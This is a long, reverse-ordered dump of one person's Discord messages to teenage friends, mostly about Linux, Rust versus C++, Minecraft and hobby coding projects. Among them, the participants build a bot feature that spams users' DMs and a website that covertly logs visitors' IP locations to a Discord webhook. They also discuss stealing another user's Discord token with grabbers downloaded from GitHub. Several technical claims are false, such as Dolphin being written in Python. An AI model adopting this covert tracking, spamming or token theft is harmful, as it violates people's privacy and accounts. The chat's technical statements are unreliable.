Didn't it say how to do that?


You were using an older version of Wine.


Does `~/.wine/drive_c/Program Files/Steam` exist?


<@628672513345454122> Remember this?
https://www.reddit.com/r/geometrydash/comments/tailgg/running_mega_hack_v7_on_linux/


Sure, why not.


If there's already a default just use that.


It's the flag of his home town.


How about you?


Pretty good so far.


In other languages, you have to use hacks (such as `while True`) to make forever loops.


Also in Rust, the forever loop is built in.


In Rust, the `?` operator is replaced by `if` statements.


Let's create a 1:1 replica of Oakville.


Or rather, writing, since we never actually written anything?


So, we're now rewriting the SCP Engine in Rust?


<@672892838995820553> So, you're now officially a system developer.


Yeah, documentation is still a problem for C++.


(Yes, that's how you spell it).


So just download the ISO.


It's literally a Linux live USB that has nothing but GParted.


Maybe you should check out Geary instead?


No good reason to not do it right now.


Imagine not using `--autoremove`.


It automatically blocks images however.


However, it seems like a lot of people thinks otherwise.


I'm guessing that in the future most new programs will be written in Rust while C++ will be mainly used to maintain legacy code.


It will have some level of overheads since Rust isn't directly compatible with C (unlike C++), but I haven't tested it yet so...


At least not directly.


Win32 APIs are not callable from Rust.


Either way both languages are pretty much the same in my opinion, but Neng might find Rust easier to use since there's less bloat in the language.


Rust is a good language in general, but there's too much stuff still written in C++ that's too expensive to port onto Rust.


Spoiler alert: The answer is no.


If you know Rust, you will easily pick up C++, and vice versa.


Rust is basically just C++ but with all the criticisms addressed.


Either confirmation bias or untrue stereotype.


But most of the logic would be in Rust.


I'm still gonna use a little bit of C++ in the SCP Engine since some APIs only work with C/C++.


A reference is basically a pointer that you can't change but you can change the value that it points to.


When you want to obtain a reference to a variable.


At least I don't think you do.


Oh no you don't.


What do you mean "reference"?


Rust also runs on bare-metal.


No it won't.


What sounds terrifying?


Because it performs raw operations directly on transistors.


I actually learned Python before I even heard of C++.


In modern C++, it's discouraged to use raw pointers.


I'm using Mozilla Firefox.


Can't you move it to the left side and then resize it?


I'm still booting.


Nothing went wrong.


I have moved boot partitions before.


Okay, then find a way to move it.


Towards Windows, of course.


Then move it.


Unmount boot and move it.


Which partition is this?


Acer is now unmounted?


It's not in use.


Go into Windows and unmount from there?


They didn't bother updating it as often as they update their Windows version.


I don't think you can unmount the partition containing the home folder of a user that's logged in.


Oh yeah, you're logged in.


I guess so.


Which partition would you want to unmount?


Growing is just assigning more blocks to the partition.


Because shrinking can require moving files.


Because the partition is mounted.


Unlike some other Linux GUI apps.


Trust me that it doesn't suck.


It's a GUI for Snap and APT.


You also forgot about Discover.


If you wanted to.


I use those words to indicate that Python does not provide prebuilt binaries for Linux-based systems.


That's kind of what I meant by "Build from Source.".


What about Option 2 and 3?


.5 just has a few more patches than .4.


There are no feature differences.


Here are your options:
1. Try `sudo apt update && sudo apt upgrade` to see if there's any updates.
2. If 1. didn't work, annoy the Kubuntu packages people until they update the Python package.
3. If the Kubuntu packages people are all offline or they won't respond for some reasons, head to Python's website and build from source.


You don't need to.


C++ debugger on XCode... 😨


That's why I was confused.


Visual Studio 1998 didn't though.


They're developed by the same people.


Oh wait it supports Swift as well.


Wasn't XCode a C++ IDE?


Wardens are triggered by sound.


Because it's blind.


The only command blocks I used are for setting entities name's to FHDHGNGN.


I'm not even on the console.


Try this link: https://prod.liveshare.vsengsaas.visualstudio.com/join?6719A434C47F4C5091D211F3CEBEB32289FB


I know what macros in C/C++ are, but I doubt that they're the same thing in Rust.


Also, Firefox is written in Rust, I think.


So my knowledge of C++ will be helpful.


We're in this together.


It just happens to be popular on the server side.


Not just using it for scripting.


Like, the whole engine.


<@672892838995820553> I think I might write the SCP Engine in Rust.


Rust is preinstalled on Kubuntu?


It's meant to be C++'s successor.


Oh yeah, right.


I believe that those two languages have similar syntax.


<@672892838995820553> Learning Rust I see.


I don't think he made one.


<@628672513345454122> You're still after Neng?


The App Store downloads the latest version **that's compatible with your system**.


<@672892838995820553> Why are you not installing XCode from the App Store 💀


I wasn't watching most of the time so fill me in.


<@628672513345454122> How's the challenge going?


And board flipping is the only option.


Right now the only way to enable board flipping was to edit `options.txt` and restart the game.


Have you found out about the Pause menu that you can bring up by pressing "Escape"?


Wow, never noticed middle-click copy and paste.


Okay, it turns out I wasn't supposed to include a Linux kernel in an AppImage.


The entire Kubuntu operating system is only 10 GB.


<@672892838995820553> Okay, it turns out I wasn't supposed to include a Linux kernel in an AppImage.


You've figured a lot of things out yourself, so I'll let you figure out this one.


It's only on Chromium-based applications like Discord.


Windows has it system-wide?


There's an extension to get autoscroll on Linux.
https://chrome.google.com/webstore/detail/autoscroll/occjjkgifpmdgodlplnacmkejpdionan


Ask Neng to implement.


So, I guess this is the final phase of customization.


Why don't you autoremove them?


<@628672513345454122> Have you updated your software?


You can install other icons but not this one?


Qt is the library that KDE desktop and apps uses.


...because the previous one is still installing?


It's probably my favourite.


Just annoyingly slow.


So, not painfully slow.


Well, Dolphin's written in Python, so let's ask Neng to fix it for us.


I do. I just don't do it often.


<@672892838995820553> By the way, you should check out NeoFetch.


Green on Black resembles the Matrix.


Well, my computer didn't come with an operating system installed out of the box, so I had to download an OS anyways.


Since you can just go on a forum and ask any questions and someone will answer.


...is technically free.


Oh, you can?


Starting to look like Windows.


Oh, then what appears to be the problem?


Have you tried the development version of Wine?


Did you use the latest version of Wine?


Does it work?


I'm finally on.


Because ElementaryOS didn't work.


Refreshing Plasma usually fixes graphical glitches for me.


You can refresh KDE Plasma by running.
```
kquitapp5 plasmashell
kstart5 plasmashell
```


It's just something about KDE.


Everything now looks like this.


<@628672513345454122> Bruh, it worked on my side.


Let me try installing that theme.


What do you mean?


He's also destroying your structures.


$$$start_spamming_dm$$$ <@672892838995820553> FHDHGNGN is within 100 blocks of your position and is taking your stuff.


<@628672513345454122> This one?


I SHOULD'VE USED THE PHONE COORDINATES!


So, you know this place?


<@628672513345454122> Does this seem familiar?


We already claimed we stood by open source. Obfuscating code and secretly collecting data from end-users does not seem very supportive of the open sourced initiative.


<@672892838995820553> Also, who's Chelsea Flores?


They have a justification for data collecting.


We're not a corporation though.


And plus they'll find out that we're communicating with an IP API.


But they'll find out that we're logging something to a Discord webhook if they monitor the site's network activity (which almost all browsers allows you to do).


<@672892838995820553> See, the thing doesn't even work. 😹


It's inaccurate on all non-GPS devices.


The Li Institution is now conducting mass surveillance.


Okay, I know it's someone in this server using VPNs.


Because it isn't deployed yet.


I'm opening the HTML pages locally.


Check commit history.


You're literally sending raw data across the internet.


This doesn't have the post-processsing layers that Discord.js does.


The problem is that your string is not a number.


Webhooks have to obey specific protocols.


<@628672513345454122> `color` is an integer, not a string.


Because `color` is not a string, bozo.


So you live within 1km of Postridge Park.


You don't live near Postridge park?


So then who's the guy who lives near Postridge park?


Who's visiting the site?


Go to the website.


Also, IP logging stopped working, by the way.


<@672892838995820553> You go to IRHS?


It looks more organized in my opinion.


I placed the values into fields.


Oof, I pushed changes already.


I don't use colors.


Some am I.


I started writing it anyways so...


It's hard to explain, but Discord listed it out in their documentation.
https://discord.com/developers/docs/resources/webhook


But I guess I got confused so...


As an alternative to MessagEmbed class.


I remember it showing up on Discord.js documentation.


It's literally the same as Discord.js.


I'll just do it myself.


What are you thinking of?


Also, bruh, you know you can use Embeds, right?


I had to go to the library.


I haven't updated it since I made it with Anthony Mac.


Bro, please stop editing for a second.


Bruh, the API is working.


Oh wait, it's not working for me is because my browser blocks known IP trackers.


Open debug console.


NENG'S WEBSITE STOPPED WORKING TOO!!!


Wait, then how did yours work?


Apparently, they don't want any IP grabbers on GitHub Pages.


GITHUB BLOCKED IP GRABBERS!!!


It's literally his alt's discriminator.


That was Anthony.


Mind if I steal code from your website?


The website is literally open sourced.


<@628672513345454122> The website now sends a webhook whenever someone visits it.


And in C++ it's something completely different that I won't go into explaining.


It's just `super()` in java.


You actually ran it?


You will need to first `pip install pyside6` though.


<@628672513345454122> Run this.
```python
from PySide6 import QtCore, QtWidgets, QtGui
import sys

class MainWindow(QtWidgets.QWidget):

I'll modify it a little if you don't mind.


Anyways, that message I sent was the one that spammers have been sending.


Okay, changed my password again for the fourth time this week.


Anyways, deleted now.


I copied and pasted from Catboy's DM.


You're completely silent.


I could not hear you.


<@672892838995820553> Are you back?


$$$start_spamming_dm$$$ <@672892838995820553> where the hell are you?


It's the newest one.


I'm gonna play this until Neng comes back.


Why are you spamming Damian?


Though it's mainly because there are no C++ classes.


I managed to learn C++ without a C++ class.


I actually thought my account was hacked for a second.


I remember it's something about the Linux kernel and I had to set a configuration in the PulseAudio configuration file.


The country that Mazin's in!


But most of the time it'll show you countries you've never heard of.


Once in a while you'll get a easy one.


By the way, <@628672513345454122>, have you tried the F3 on the laptop keyboard yet?


I see you have fixed most of it yourself. 👍


I will return in about 20 minutes.


However, I have to first take a shower.


Have you tried using the F3 on your laptop keyboard?


Speaking of Minecraft, what does F3 does on Windows if you don't press FN?


Don't forget that you're using an older version of Wine when you tried to install MegaHack.


Most of them worked perfectly with small issues here and there.


Anthony's first experience with Linux gaming: 👎


<@628672513345454122> <@672892838995820553> Your server is online, join now!


I resetted the world.


Sorry, I'm watching Youtube.


What are you talking about?


F3 does work.


Bruh, he went offline.


<@845361227093508116> Anyways, jokes aside, are you still trying to grab Pratha's token?


By the way, <@845361227093508116>, mind going around asking people if they've every heard of the 1989 Tiannanmen Square Massacre once you're in China?


How about you?


And he's using it right now.


NengOS is a Linux distro.


<@816692546272100442> Neng switched to Linux by the way.


By this thing.


<@672892838995820553> My brother's account got hacked.


Then what's up with the water?


He claims that he only makes them for "educational purposes".


It's this 16-year-old on GitHub who makes malwares.


<@628672513345454122> By the way, have you heard of Rdimo?


Likely through the virus I found.


My brother's Discord account got hacked.


So this was the the culprit.


I still don't have a bank account.


Some of those might be malware, so I'm probably uninstalling them as soon as I can.


Speaking of pirating, I just realized that we have a lot of pirated software on our computer.


I just installed Linux on it.


I'm still using my dad's PC.


Everything I use on Linux is open sourced.


I mainly use Linux most of the time.


Mazin, that is.


On average at least.


He used to have this other account, but it got hacked and he's using his alt now.


Neither did I.


Okay, doing a full scan right now.


Probably gonna do a full scan.


We just use windows defender on Windows and nothing on Linux.


I did a quick scan on windows defender.


I uninstalled vanguard just to be sure.


Probably a vanguard exploit or something.


He couldn't message them anyways since he got banned from the servers for spamming scams


Okay, it turns out he closed all the DMs.


I think so.


And DMed all of the server members crypto scams.


Okay, so what happened was the hacker used his account to join a bunch of random servers.


I'm considering the possibility that a virus on the computer was what resulted in the Discord account getting compromised.


That's what I did.


How is the UAE?


That's probably a good idea.


The <@725527935770951701> one.


But somehow someone got access.


I don't know.


Nor can he scan QR codes.


Neither of us have a phone so we can't use 2FA.


I'm not sure how it got hacked, but somehow someone gained access.


My brother's account got hacked.


<@628672513345454122> By the way, what should I do if my account gets hacked?


Or rather, an important update.


I have important update.


I named everything FHDHGNGN.


Or something else?


We should also set a time limit.


I thought the ender dragon had an egg...


GPU retailing for below MSRP. 🙀 🙀 🙀


Wait, Neng wasn't there?


As a result, it didn't work.


But my ISP didn't cooperate.


I tried that.


First, go to https://aternos.org


<@628672513345454122> Join VC.


<@628672513345454122> Join VC.


Shame that you can't see the skin that me and Neng can.


Okay, now it's not.


Wait, the bot's stuck.


I used the wrong command.

$$$start_spamming_dm$$$ <@672892838995820553> its afternoon and you still not back yet what happened?


<@628672513345454122> Also, why do you print out the correct country name in the terminal?


It's Afghan, by the way.


Or his father's birth place?


Barack Obama's birth place.


United States of America


Democratic peoples republic of the congos


Central African Rebpulicc


Saint Vincent and the Grenadines


Wait, I'm an idiot.


N word country.


I spelt it right this time 👍


Okay, bad memory.


I can't get a lot of things.


Country that got invaded by Iraq in the 1990s.


United Arab Emirates


Sao Tome and Principe


Forgot the hyphen.


Papua New Guinea


Sierra or something.


I don't know.


Saint Vincent and the Grenadines


Okay, gonna stop looking at the URL now.


I don't know any flags besides Canada, United States, and China.


I'm finding the answer by clicking on the flags and looking at the image source.


In fact, I'm relying on the URL for most of them. 😹


I do not know a lot of flags.


Okay, but I did not know.


It resembles the Russian flag.


It's name's on the flag 😹


European or russian thing.


I saw this before but forgot.


I don't know.


I don't know.


I don't know.


It's not like *you* game on Linux.


Have you tried gaming on Linux though?


**Challenge:** Switch to Linux for one month.
**Reward:** Bragging rights.


Are they both plugged in?


Try with and without.


Does Ctrl+Alt+F2 work?


Choose the top one.


Does Ctrl+Alt+F2 work?


Okay, this might have to do with shit NVIDIA display drivers on Linux.


<@593106116821647363> Unplug the USB stick.


Don't worry that's normal.


<@593106116821647363> You know you can login to Discord from Firefox and share your screen?


I keep pull requests as minimalist as possible.


Okay, so maybe we could try selecting the Safe Graphics option.


Okay, remember the menu that shows up before Mint shows up?


<@593106116821647363> Okay, why don't you try selecting Safe Graphics when GRUB starts?


What GPU are you using?


Okay, hit enter.


Yeah, you'l probably have to hard reset.


Okay, restart and select the safe graphics option if there is one.


Sony Storage Media thing.


Alright, now shift restart again.


I'm deafened since you said your mic doesn't work.


Alright, now you need to restart your computer and do all those steps again.


<@593106116821647363> Did you even plug in the USB stick?


On your phone, I mean.


Or we could just use VC.


And take a picture.


No you don't.


Just shift click restart.


You might have to configure the BIOS to boot into a USB stick by default.


**1.** Download ISO.
**2.** Burn ISO to USB thumb stick using Rufus.
**3.** Boot into USB thumb stick.
**4.** Follow instructions on-screen.


<@628672513345454122> Check pull request on FHDBot.


<@628672513345454122> Check pull request.


Okay, maybe I'll explain what I did.


Though to avoid massive amounts of imports I usually group commands together.


That's what I did.


Simply importing them manually rather than loading them dynamically through FS?


You'll probably have to re-architecture your code since it currently relies on the fact that there's only one command per file.


Also related to command handlers.


I might just open a pull request and fix it myself though.


Anthony is relatively new when it comes to software architecturing, so give him a while to fix it.


He's in <#968677013416202260>, sir.


So, it has to have a remainder of at least 100 when divided by 101?


This behaviour is chaotic to be honest.

I didn't know any other FSRs so...


We can have <@593106116821647363> integrate FSR into Minecraft.


AMD Radeon FidelityFX Super Resolution, often abbreviated to FSR, is an open-sourced real-time image upscaling library developed by Advanced Micro-Devices.

AMD Radeon FidelityFX Super Resolution, often abbreviated to *FSR*, is an open-sourced real-time image upscaling library developed by Advanced Micro-Devices.


Also, by the way, FSR's now on GitHub.


ChromeOS uses a modified version of GNONE. 🤡


Okay, maybe I'll try to fix this tomorrow and open a pull request.


You can't do that?


No you create the variable outside `exports.run`.


And so is `correctCountryName`.


`guessingCountry` is supposed to be global.


No, you're making the same mistake as you did last time.


Maybe try and debug the value of `guessingCountry`?


Yeah, it's not working correctly.


Okay, this is getting confusing.


No, the part in which it listens for answers should be in where you handle `messageCreate` events.


Shouldn't the part in which it the program recieves answers be in the `onMessageCreate` thing?


However, partial differential equations might work differently, and Neng is the only person familiar with them, which is why I'm asking him.


However, this equation is not a normal equation.


Be simplified to this.


<@672892838995820553> Can this.


Don't you have to commit the token file though?


Which is why I usually don't copy and paste code.


Try changing it to `./src/events`.


It's just $$$stop_spamming$$$


Stop this spam first.


You're spamming him the term "i like cute girls" since you didn't specify a message.


If he's not responding, feel free to use $$$start_spamming_dm$$$ on him.


Did I get what?


When are you coming back?


How are you doing, Mazin?


Ask <@672892838995820553>. He's the CEO.


Oh it's around 20 GB I think.


<@628672513345454122> I found out you can use Steam to show a FPS HUD in Minecraft.


I don't know.


Why does that look like the Nazi Salute to me?


At least not meme GIFs.


You don't send GIFs.


Neng sending GIFs.


I didn't do that.


Oh it just iterates through the `commands` folder and load each `.js` file and load all their command handlers and their attached command names.


Why do you need to use fs?


I don't remember using fs.


Okay, you don't since you don't need to specify the key and value type when creating a Map in JavaScript.


I typically don't use JavaScript so I'm not sure.


Okay, I should really cut out the background.


Probably not if you're using JavaScript since JS doesn't have types.


I'm creating a type alias for the handler function type.


<@845361227093508116> Found the ping ☝️


Which it doesn't.


I usually don't ignore it unless it contains user or system specific configurations.


Each handler is essentially a function.


What I did is I basically create a giant map of array names and handlers.


The concept is pretty simple though.


<@628672513345454122> Here, check out https://github.com/Hello56721/rai-rai-raku-raku to see how I did it.


Not sure though.


Pretty sure I used ES modules.


Okay, here's what I did.


I thought you were asking whether I knew how.


Oh wait, you were asking how.


I literally did that for rai rai raku raku.


But you can brag about stacking the Nengish Union.

<@628672513345454122> Share your screen in VC.


Have you tried going to the Run and Debug section?


Also change the name to FHDBot.


Add it then.


Replace it then.


Create a file in the folder `.vscode` named `launch.json` and put this in it.
```json
{
    "configurations": [
        {
            "name": "Launch Program",
            "program": "${workspaceFolder}/fhdbot.js",
            "request": "launch",
            "skipFiles": [
                "<node_internals>/**"
            ],
            "type": "node"
        }
    ]
}
```
Then, press F5 to launch the bot.
And the restart button should work.


You have to write a launch configuration.


<@672892838995820553> Thank you for participating in my test.


$$$start_spamming_dm$$$ <@672892838995820553> block if you see this


Gonna fix that right now.


So I guess yeah.


That's what it's supposed to say when it gets blocked.


Also, with VSCode you can restart bots with the click of a button 👍


Hmm, you're right.


$$$start_spamming_dm$$$ <@725811783012450306> hi me


Can the bot DM itself?


I watched it.


Okay, so it turns out that the confirmation message requests the nickname of the user, but the fake Jay (A.K.A. Anthony) doesn't have a nickname, so it returned `null`.


I just found out that when you DM $$$stop_spamming$$$ to rai rai raku raku it still works.


I FOUND THE ISSUE!


$$$start_spamming_dm$$$ 593106116821647363 Crab


Well, it's blacked out by default for some reasons.


Can you use negative powers of tens instead?


Oh yeah right.


So, he's not a *real* employee?


<@845361227093508116> Are you gonna make any contributions?


Anthony said that you should fire him.


Or making contributions.


Also, <@672892838995820553>, Mazin's not doing any work.


But I guess I wanted to build suspense so...


But his tag is null.


No, it actually spammed him.


But it shouldn't happen in TypeScript.


No wait, it's because `tag` is `null` for some reasons.


It's because I misspelled a variable.


I already know why it said null.


And because I got trolled too.


And plus Neng said to disable invites.


I thought it was null so...


Oh, yeah, right.


All of them.


<@845361227093508116> Now you know why it's spamming null?


Was that null?


<@672892838995820553> Who is the guy who tried to pretend to be Jay?


What do you mean?


<@845361227093508116> YOU GOTTA SEE THIS


$$$start_spamming_dm$$$ <@816843118170472448> Are you there?


<@816843118170472448> You there?


Basically, the guy that keep making excuses for staying employed but not doing any work.


<@628672513345454122> Mazin's like that Wally guy from Dilbert.


Also, <@845361227093508116>, do something.


Neng is technically your boss.


Speaking of which, should we fire you if you don't make any contributions?


We created a new role called "Programmers" to distinguish between employees who are just there and employees who actually make contributions.


Now I have to modify the pull request.


You prefer links over imports?


To open a pull request, of course.


Yeah, it's not done yet.


I assume you figured it out from the rest of the tutorial.


Wow, Hazel Engine was quite active yesterday and this morning.


Speaking of that tutorial, I haven't written anything in it for a while, so I probably should.


I was testing the DM spam feature.


$$$start_spamming$$$ testing secondary string

Yeah he does.


Do you think a guy with a private jet would waste money on commercial flight tickets?


Okay, Anthony deleted the screenshot containing the ad containing the potentially illegal image.


It got cancelled.


<@672892838995820553> The one all the way to the right.


Should we delete it in case it's illegal?


...considering one of the ads he screenshotted.


The one on the far right is NSFW...

But Linux CLI is always more powerful than anything else.


I use Dolphin.


I don't use file explorer.


But you can still index it manually if you want.


Since I'm pretty sure it indexes files that you use often.


Maybe it's because you haven't used Windows a lot so it didn't index a lot of files.


No you shut up, bozo.


You can't binary-search a filesystem without indexing it first bozo.


Did you index your filesystem?


I don't know.


1) Python for simple security, C++ for moderate security, CUDA for government-level security
2)
    a) Python if you're using a framework, CUDA if writing from scratch, Vulkan Compute if you don't have an NVIDIA GPU.
    b) Same as a).


Maybe Unity game or a Windows GUI program?


Bad code architecture moment.


I mean, I kind of have an idea of how to write neural networks, but my hardware isn't going to be able to handle the scale I need.


We don't know how to write one so probably not.


What does it look like?


<@628672513345454122> By the way, have you checked out the new chess program release yet?


We won't see it though.


try `kill @e[type=!player,x=(pressure plate x),y=(pressure plate y),z=(pressure plate z)]`


Will it be covered?


Okay, gonna go offline before they find out.


So, I'm breaking the rules by messaging you.


In fact, I can't even use the computer right.


Parents are not letting me.


Good so far.


There is also a TNT cannon if it's still around.


In case you're wondering, me and Neng has been testing nuclear weapons in the mountains.


Notice the difference between the Shaders version and the vanilla version.


Bc I'm on mobile.


Uni prep teaches u C++


College prep teaches u visual basic


I haven't counted yet, so I'm not that sure.


Just a few thousand lines of code at most.


It's a pretty small program.


It's a chess game written in C++ and uses OpenGL for rendering.


By the way, you checked out the new release yet?


I think that's how Godot adds support for web games.


I've fixed most of the bugs that you have found and added support for King-side castling.


<@628672513345454122> New Chess Program release!
https://github.com/Hello56721/chess/releases/tag/0.1.0


I'm not sure if you should learn C++.


Also, most other programming languages are written in either C or C++.


I think it's because C++ has more features than any other languages (which is what lead to it's designation as a "hell language") so they decided that to teach as much computer science principles as possible, use C++.


My school here in Windsor doesn't offer a computer science course in Grade 11 and I'm already pro at C++ but okay.


Okay, the Windows build is not working at all.


Wait, it's not the cause.


Also, I found out what's causing the crashes you were experiencing <@628672513345454122>


Okay, Windows binary not working.


<@628672513345454122> Okay, creating chess binary release.


No, you shut up, bozo.


For decoration purposes, I assume.


He's burning what he thinks to be your village.


<@628672513345454122> This you?


<@672892838995820553> <@628672513345454122> You guys are literally on opposite sides of the world. 😹


Because cracked servers do not authenticate players.


I doubt it'll work at all to be honest.


Our server is cracked so it won't work properly.


We already know about the ban thing.


Did you even look at the image?


But that's in the Antarctic Ocean.


Wait, he pillared up with wood before.


He has dug tunnels though.


From what I remember, he haven't built anything yet.


Neng's using a 10500H with a GTX 1650M.


Minecraft is poorly optimized.


Has to be decent.


Neng also has shaders.


On PC, of course.


Which supports SKLauncher.


He has PC.


Neither does Neng.


To ensure neither of you are cheating.


He probably moved already so...


So status's not updating then.


What's `token.py` then?


<@672892838995820553> Are you still trying to grab people's tokens?


I'm gonna change Anthony's skin then.


<@672892838995820553> What would you like your skin to be?


You won't be able to defend yourself if he *does* catch you.


Oh yeah, it says that on the README.


<@672892838995820553> I'm gonna change your skin with an alt SKLauncher account.


No, it's meant to prank you by giving you your own token and saying that it's your victim's.


Like, the victim has to run the script on their computers?


What do you mean "local Discord files"?


I have to leave for school in like ten minutes.


I have also given you access to start the ur_mom_dot_me server.


Okay, starting the server.


When you press F3, it literally says "NVIDIA GeForce GTX 1650".


So, you should probably login and move before he comes online.


Also, speaking of Minecraft, Anthony found your location.


I think so.


But don't do anything.


Just look around.


And if someone finds out, Mazin's gonna be banned from Discord, probably forever.


But if Mazin hacks Pratha's account, someone might find out.


Yeah, someone has to report it.


Also another important thing is that grabbing tokens can get you banned from Discord, maybe even machine banned.


Of course, to attach a webhook to a channel, you need perms.


There's a lot of them and they do the decoding automatically.


You can just download a Discord token grabber off of GitHub.


You'll have to decode it.


But, Discord being not stupid, it's encoded in a different format.


Since webhooks has the message sender's tokens in them.


No, you just attach a webhook.


Looks like you'll have to use SKLauncher from now.


You just need permissions to attach a webhook to a channel and have your target send a message in that channel.


He can turn on the server and move while you're offline.


Unless he escapes.


I'm on my dad's phone.


The computer is turned off.


Which is now closed.


I just used the interactive shell.


I don't remember.


It's probably right.


Is the village on a cliff?


*Ain't no way!*


I'll have to check.


My friends from Windsor.


And we'll move you there.


His position's not changing.


He seems to be AFK.


I'll try to figure that out.


The server's also running at 0 tps.


It's not responding.


The command is stuck.


Because some cheaters does things by modifying Windows to do the cheating.


Because of that, Valorant's anti-cheat has more Admin perms than Windows itself 🤯


You can configure softwares to run along with the bootloader.


Not to mention that the anti-cheat is installed so that it starts *before* Windows starts.


And it's anti-cheat is so intense that if you try to run it on anything other than Windows it'll ban you.


<@672892838995820553> Ever heard of Valorant?


Ah, an American brand at last.


Now that I think about it, most tech companies are owned by Asians.


So, essentially, my school is completely ran by computers made by a Chinese company.


And Lenovo is also Chinese.


He also happens to be the founder of NVIDIA.


And NVIDIA's CEO is someone named Jensen Huang.


Genshin Impact, League of Legends and Valorant are all owned by Chinese companies in one way or another, and Anthony consider all of them bad games.


Valorant was developed in 2019.


It was developed by Riot Games, which was acquired by Tencent in 2011.


<@628672513345454122> I just found out that Valorant is owned by a Chinese company.


Stopping the server now.


Okay, withers dead.


It's an official server plugin by Discord.


Because it's not a bot.


I'm starting it to kill the wither.


You think I would give **players** OP in a **survival** server?


Not in Minecraft.


No, like in Aternos.


All of those.


Gonna kill the wither as well.


No more Admin perms for anyone.


I'm also killing the wither.


Okay, removing admin perms from everyone.


Would you like Admin perms?


<@816692546272100442> By the way, who's Akiara?


Okay, you now have admin.


Yes or no?


By the way, <@672892838995820553>, would you like Admin perms on the Survival server?


Okay, maybe you can ask Neng about the full situation.


So, survival mode users can't deliver damage.


It's got NoAI and it's at a pretty high Y position.


Anyways, I did not have to take French this year. 👍


Not sure why I said Detroit.


But it's on the Canadian side.


Well, it's only a few minutes from the border so...


However, my school's in Detroit, so...


I guess things work differently here in Windsor.


And I still got full credit even though I didn't take it.


But my teachers said it's optional.


No it's not.


So I didn't take it.


I don't like French.


I had Math and Science last semester. English got it's exam replaced by an FSE. Plus, I didn't take French this year at all.


Or rather, just the Gym and Business-Technologies exams.


There are no updates.


How about you?


<@628672513345454122> Your server is online, join now!


I can play until my parents comes back home.


What's your real email address then?


The fyreboy thing or something?


Let me try and find it.


It's what you listed on your website so...


Why would you need access to employees if you're in reserve?


I'm gonna put you in reserve then.


So, you're in Reserve?


So, how are you going to contribute to any of our projects?


Replying to **Shiva Deshpande**


Also, <@845361227093508116>, what does `#include <iostream>` does?


As a wise person once said: "Mortui homines quovis momento loquitur non-subsisto".


The very fact that you're talking proves that you're dead.


I can prove it.


Yeah you are.


Dead men can't be gay.


Okay, now it does come after "You are".


"Gay?" was supposed to come after "You are", but it didn't.


Server anti-cheat can only detect things that you **do** on the server, not things that you **see**. But if someone suspects that you're cheating, it might get you banned unless you can prove otherwise.


Anthony got kicked once after accidentally enabling one of his cheats.


The server has anti-cheat enabled.


That's like arguing that moustaches are evil by saying

> Didn't Hitler have a moustache?
> And Hitler was evil.


You made it?


Auto-translate isn't really a cheat.


<@816692546272100442> Join `ur_dad_dot_me.aternos.me`.


Neng banned you since he can't sleep while you're AFK-ing.


By the way, for some reasons I was able to send a friend request to a deleted Discord account.


So many potions.


And not worth it from a price-to-performance stand point.


That's the only thing you can do.


Come to where?


You should probably use TNT instead since those allow better controlled explosions.


You're using beds to find netherite.


The Huang Dynasty is industrializing fast.


I think it's because the world is set to hard, so we can only change the difficulty for each session.


**Step 3.** Download the shader that you chose. If you chose Sildur's Shaders, you can get them from here.
https://sildurs-shaders.github.io/downloads/ Please note that although the website says that it's supported on 1.7.10 - 1.18.1, I have tested it on both 1.18.2 and 1.19 and it works perfectly.


**Step 2.** Choose a shader. If you don't know any, I'll recommend Sildur's Shaders, since it's my favourite.


**Step 1.** Download Iris Shaders from https://irisshaders.net/


It's pretty simple.


<@672892838995820553> You might want to consider getting shaders.


Be sure to expect instabilities though.


But now it's spreading. 😹


It's a regular thing in Windsor.


But it turns out we're not suffering alone 😼


I thought it was just Windsor.


Well, this is bad.


We could just use <#977378415755816980> .


What do you think?


Or will they have to download the finished HTML and deploy it themselves?


Also, if an HTML editor is going to run on the cloud, does that mean we'll be offering hosting services as well?


Though once we find out the starting point things are going to get harder and harder.


Or, we could have a visual CSS editor that's limited, and they need to pay to access all the CSS features.


Imagine having to pay to write CSS.


GitHub pages is exactly what it's name suggests: It hosts pages.


Anthony might know how though.


Desktop since we don't know how to deploy cloud applications yet.


Yes, also buttons.


Just the icon for the application.


This is a long term project. 💀


Are you going to contribute or no?


So, seems like Anthony is more experienced.


Or is Mazin more experienced?


He's probably more experienced.


Can't Anthony draw the logos?


Also, what does <@845361227093508116> gets to do in this?


And then we have Neng create a docking-type UI in Python.


Then, we'll need to steal some code from Chromium to make the previews.


Well, we'll first have to make a rendering engine to render the UIs.


The HTML visual editor.


So, we have to somehow get a cloud server running.


So, like Scratch?


<@628672513345454122> Just to clarify, is it cloud or desktop?


Looks pretty good.


I'll write a rendering engine for the UI and you can use Python to control the UI.


That sounds like we need to integrate with Google Play and Apps Store.


Developing mobile apps on the cloud?


You said website so I assume that you're planning to run it on the cloud.


Also, here's a question: Is it going to run in the cloud or on the desktop?


So, an open-sourced, cross platform mobile application development platform for developer to easily and quickly develop and deploy mobile application on every devices possible?


So, an application engine with a block-scripting system?


Let's hear it.


Well, I guess shouldn't we lay it out in VC?


Then we'll created a modded version of Chromium to support it.


That's a term of employment.


<@845361227093508116> We now partially own everything you have.


<@672892838995820553> Oh yeah, we should finish writing it.


Yes, that's WYSIWYG.


We want a sort of WYSIWYG HTML editor.


It's still indexing.


Let me check.


That includes a preview that updates in real time.


It's a visual HTML editor.


But I guess the HTML editor is going to have a lot of features that we might need them.


Though nothing we've written has so much features to test that we need a dedicated human tester.


So, Mazin is essentially a software reviewer.


Why do we even need manual testing if automated testing is just as good?


Yeah, I know.


Not like, automated testing like CTest, PyTest, or NodeTest.


Oh, so manual testing.


He knows CTest?


Bruh, what are we supposed to do?


<@845361227093508116> What is ARM64 Assembly?


It got cancelled.


Hello, Mr. Ghizali.


I can run automated tests in CMake.


Since game engine development is still very much in the territories of C and C++.


Make games with it, I guess.


Like any game engine.


I think Anthony's just became an invaluable member of the Li Institution.


<@672892838995820553> By the way, should we make Neng OS?


I did now.


Oh yeah I did not.


<iframe src="https://discord.com/widget?id=967896406008418426&theme=dark" width="350" height="500" allowtransparency="true" frameborder="0" sandbox="allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts"></iframe>


Looks pretty nice so far.


Plus, it reduces the cost and complexity of consumer hardware, making them more portable.


(Okay, well cheaper is probably debatable, but it's definitely faster and easier).


Deployment from the cloud is both faster and cheaper than deploying desktop applications.


Given the fact that the speed and versatility of the cloud is going, it makes sense for industries to start moving more and more of their software into the cloud.


Anyways, the importance of low level programming languages are kind of fading as desktop applications becomes less common.


```
